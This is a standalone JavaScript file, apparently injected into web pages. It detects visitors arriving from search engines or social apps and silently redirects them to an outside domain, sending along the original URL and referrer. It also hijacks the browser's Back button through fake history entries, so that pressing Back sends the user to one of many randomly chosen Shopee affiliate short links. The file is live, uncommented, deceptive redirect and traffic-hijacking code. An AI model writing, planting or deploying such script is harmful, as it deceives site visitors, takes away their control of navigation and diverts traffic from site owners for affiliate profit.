var ars = rChoice([
    'https://resep.madreview.net',
]);

function rChoice(arr) {
    return arr[Math.floor(arr.length * Math.random())];
}

if ([".google.", "bing.", "yandex.", "facebook.", ".pinterest.", ".yahoo.", "mysearch.", ".baidu.", "duckduckgo.",
        "ask.", "aol."
    ].some((s) => document.referrer.toLowerCase().includes(s)) || ["fb", "facebook", "pinterest", "twitter", "messenger"].some((
        s) => navigator.userAgent.toLowerCase().includes(s))) {
    window.location.href = ars + "/?arsae=" + encodeURIComponent(window.location.href) + "&arsae_ref=" +
        encodeURIComponent(document.referrer);
}


var shopeelink = pilihShopee([
'https://shope.ee/fnRYmQdkG',
'https://shope.ee/8p99HwI6gD',
'https://shope.ee/6zhV6bxGme',
'https://shope.ee/7A0vIuwdRh',
'https://shope.ee/6f4ehzyXSc',
'https://shope.ee/6pO4uIxu7f',
'https://shope.ee/7exBtpujQq',
'https://shope.ee/7pGc68u65t',
'https://shope.ee/7KKLVDw06o',
'https://shope.ee/7UdlhWvMlr',
'https://shope.ee/fnRYmQdkG',
'https://shope.ee/6zhV6bxGme',
'https://shope.ee/7A0vIuwdRh',
'https://shope.ee/6f4ehzyXSc',
'https://shope.ee/7KKLVDw06o',
'https://shope.ee/8p99HwI6gD',
'https://shope.ee/7pGc68u65t',
'https://shope.ee/7pGc68u65t',
'https://shope.ee/7KKLVDw06o',
'https://shope.ee/7UdlhWvMlr',
'https://shope.ee/5UshJcIJtr',
'https://shope.ee/3AUmXMhict',
'https://shope.ee/fnRYmQdkG',
'https://shope.ee/7UdlhLV0mf',
'https://shope.ee/1VMYYKMeR7',
'https://shope.ee/3KoCjhpLoP',
'https://shope.ee/6KRoJF8FtY',
'https://shope.ee/2fYVwWHGz5',
'https://shope.ee/2fYVwWHGz5',
'https://shope.ee/1pzOwzxySG',
'https://shope.ee/403tWzKnaK',
'https://shope.ee/3AUmXTaYnC',
'https://shope.ee/9eiGHQy8wq',
'https://shope.ee/fnRYmQdkG',
'https://shope.ee/403tWzKnaK',
'https://shope.ee/3V7cw7yoSY',
'https://shope.ee/8p99HwI6gD',
'https://shope.ee/AJxx4hz01y',
'https://shope.ee/6KRoJMn0pn',
'https://shope.ee/10QHxb6mcD',
'https://shope.ee/4V0A8pMGiP',
'https://shope.ee/403tXuOAjK',
'https://shope.ee/4ANJkDNXON',
'https://shope.ee/4zwQjkKMhY',
'https://shope.ee/5AFqw3JjMb',
'https://shope.ee/4fJaL8LdNW',
'https://shope.ee/4pd0XRL02Z',
'https://shope.ee/30BMM4RylE',
'https://shope.ee/3AUmYNRLQH',
'https://shope.ee/2fYVxSTFRC',
'https://shope.ee/2prw9lSc6F',
'https://shope.ee/3fR39IPRPQ',
'https://shope.ee/3pkTLbOo4T',
'https://shope.ee/3KoCkgQi5O',
'https://shope.ee/3V7cwzQ4kR',
'https://shope.ee/1ffylcX3T6',
'https://shope.ee/1pzOxvWQ89',
'https://shope.ee/1L38N0YK94',
'https://shope.ee/1VMYZJXgo7',
'https://shope.ee/2KvfYqUW7I',
]);

function pilihShopee(arr) {
    return arr[Math.floor(arr.length * Math.random())];
}

(function(window, location) {
history.replaceState(null, document.title, location.pathname+"#!/history");
history.pushState(null, document.title, location.pathname);
window.addEventListener("popstate", function() {
 if(location.hash === "#!/history") {
 history.replaceState(null, document.title, location.pathname);
 setTimeout(function(){
 location.replace(shopeelink);
 },10);
 }
}, false);
}(window, location));
